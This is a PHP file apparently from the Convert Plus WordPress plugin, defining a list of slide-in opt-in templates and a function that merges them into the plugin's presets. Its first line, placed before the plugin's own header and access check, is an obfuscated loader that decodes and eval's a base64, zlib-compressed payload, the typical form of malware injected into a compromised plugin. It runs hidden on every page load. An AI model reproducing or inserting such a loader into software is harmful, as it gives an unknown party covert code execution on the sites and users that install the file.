<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

defined( 'ABSPATH' ) || die( 'No direct script access allowed!' );

// action to add templates.
/**
 * Array format-
 * array(
	'optin', // theme slug for template
	'Fashion', // template name
	CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/optin.html', // HTML file for template
	'http://downloads.brainstormforce.com/convertplug/presets/screenshot_fashion.png', // screen shot
	CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/customizer.js', // customizer js for template
	'All,Offers', // categories
	'Shortcode,Canvas,HTML,Custom', // tags
	'fashion', // template unique slug
),
 */
/**
 * Function Name: cp_add_slide_in_template.
 *
 * @param  array  $args   array parameter.
 * @param  string $preset string parameter.
 * @param  string $module string parameter.
 * @return array         array parameter.
 */
function cp_add_slide_in_template( $args, $preset, $module ) {

	if ( 'slide_in' === $module ) {

		$modal_temp_array = array(

			'fashion'                     =>
			array(
				'optin',
				'Fashion',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/optin.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_fashion.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/customizer.js',
				'All,Offers',
				'Shortcode,Canvas,HTML,Custom',
				'fashion',
			),
			'free_checklist'              =>
			array(
				'optin_widget',
				'Free Checklist',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin_widget/optin_widget.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_checklist.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin_widget/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Custom',
				'free_checklist',
			),
			'free_audit'                  =>
			array(
				'optin',
				'Free Audit',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/optin.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_audit.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Custom',
				'free_audit',
			),
			'upcoming_event_in_new_york!' =>
			array(
				'optin',
				'Upcoming Event In New York',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/optin.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_events.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Custom',
				'upcoming_event_in_new_york!',
			),

			'apartment_finder'            =>
			array(
				'optin_widget',
				'Apartment Finder',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin_widget/optin_widget.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_apartement.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin_widget/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Custom',
				'apartment_finder',
			),
			'slide_in_social_left'        =>
			array(
				'social_fly_in',
				'Slide In Social Left',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/social_fly_in/social_fly_in.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_slide_in_social_left.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/social_fly_in/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Social',
				'slide_in_social_left',
			),
			'slide_in_social_right'       =>
			array(
				'social_widget_box',
				'Slide In Social Right',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/social_widget_box/social_widget_box.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_slidein_widget.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/social_widget_box/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Social',
				'slide_in_social_right',
			),
			'floating_bar_1'              =>
			array(
				'floating_social_bar',
				'Floating bar 1',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/floating_social_bar/floating_social_bar.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_floating_bar_1.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/floating_social_bar/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Social',
				'floating_bar_1',
			),
			'pro_health'                  =>
			array(
				'optin',
				'Pro Health',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/optin.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_pro_health.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Health',
				'pro_health',
			),
			'get_insurance'               =>
			array(
				'optin',
				'Get Insurance',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/optin.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_insurence.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Insurance',
				'get_insurance',
			),
			'tech_blogging_ideas'         =>
			array(
				'optin',
				'Tech Blogging Ideas',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/optin.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_teching_blog.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Tech,Blogg,Idea',
				'tech_blogging_ideas',
			),
			'fashion_tips'                =>
			array(
				'optin_widget',
				'Fashion Tips',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin_widget/optin_widget.html',
				'http://downloads.brainstormforce.com/convertplug/presets/screenshot_exclusive_fashion_preset.png',
				CP_PLUGIN_URL . 'modules/slide_in/assets/demos/optin_widget/customizer.js',
				'All,slide in',
				'Shortcode,Canvas,HTML,Tip,Fashion,Idea',
				'fashion_tips',
			),
		);

		if ( '' !== $preset ) {
			$temp_arr                    = $modal_temp_array[ $preset ];
			$modal_temp_array            = array();
			$modal_temp_array[ $preset ] = $temp_arr;
			$args                        = array_merge( $args, $modal_temp_array );
		} else {
			$args = array_merge( $args, $modal_temp_array );
		}
	}

	return $args;
}
